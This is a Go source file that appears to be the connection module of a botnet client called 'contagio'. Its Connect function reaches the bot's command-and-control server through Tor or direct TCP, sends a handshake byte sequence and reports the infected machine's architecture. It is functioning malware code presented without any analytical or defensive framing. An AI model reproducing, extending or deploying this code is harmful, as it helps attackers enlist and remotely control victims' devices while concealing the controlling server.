package main

import (
	"contagio/bot/config"
	"contagio/bot/methods"
	"fmt"
	"net"
	"time"
)

func Connect() (connection net.Conn, err error) {
	defer methods.Catch()

	if config.TOR_ENABLED {
		connection, err = ConnectViaTor()
		if err != nil {
			if !config.DISABLE_REAL_BOT_SERVER {
				connection, err = ConnectViaTcp()
				if err != nil {
					return nil, err
				}
			} else {
				return nil, fmt.Errorf("connection err")
			}
		}
	} else {
		if !config.DISABLE_REAL_BOT_SERVER {
			connection, err = ConnectViaTcp()
			if err != nil {
				return nil, err
			}
		}
	}

	if connection == nil {
		return nil, fmt.Errorf("connection err")
	}

	connection.Write([]byte{0, 0, 0, 30, 59, 10, 33, 10, 1, 1, 1, 5, 0, 0, 0, 0})
	connection.Write([]byte(Bot.Arch))

	return connection, nil
}

func ConnectViaTcp() (net.Conn, error) {
	defer methods.Catch()

	connection, err := net.Dial("tcp", config.BOT_SERVER+":"+config.BOT_PORT)

	if err != nil {
		if config.DEBUG {
			fmt.Println("[tcp] Can't connect to the bot server")
		}
		time.Sleep(1 * time.Second)
		return nil, err
	}

	return connection, nil
}
